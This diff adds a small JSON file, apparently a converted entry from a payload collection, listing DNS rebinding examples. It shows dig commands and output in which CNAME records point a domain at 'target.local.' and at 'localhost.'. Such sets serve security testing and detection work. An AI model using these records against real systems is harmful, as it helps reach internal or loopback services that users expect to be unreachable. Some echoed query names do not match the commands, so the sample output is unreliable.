@@ -1,0 +1,28 @@
+{
+  "source": "PayloadsAllTheThings",
+  "exploit_type": "dns_rebinding",
+  "original_category": "DNS Rebinding",
+  "payloads": [
+    {
+      "category": "CNAME",
+      "escalation": "aggressive",
+      "lines": [
+        "$ dig cname.example.com +noall +answer",
+        "; <<>> DiG 9.11.3-1ubuntu1.15-Ubuntu <<>> example.com +noall +answer",
+        ";; global options: +cmd",
+        "cname.example.com.            381     IN      CNAME   target.local."
+      ]
+    },
+    {
+      "category": "localhost",
+      "escalation": "aggressive",
+      "lines": [
+        "$ dig www.example.com +noall +answer",
+        "; <<>> DiG 9.11.3-1ubuntu1.15-Ubuntu <<>> example.com +noall +answer",
+        ";; global options: +cmd",
+        "localhost.example.com.            381     IN      CNAME   localhost."
+      ]
+    }
+  ],
+  "converted_at": "2026-04-03T07:48:28.869Z"
+}
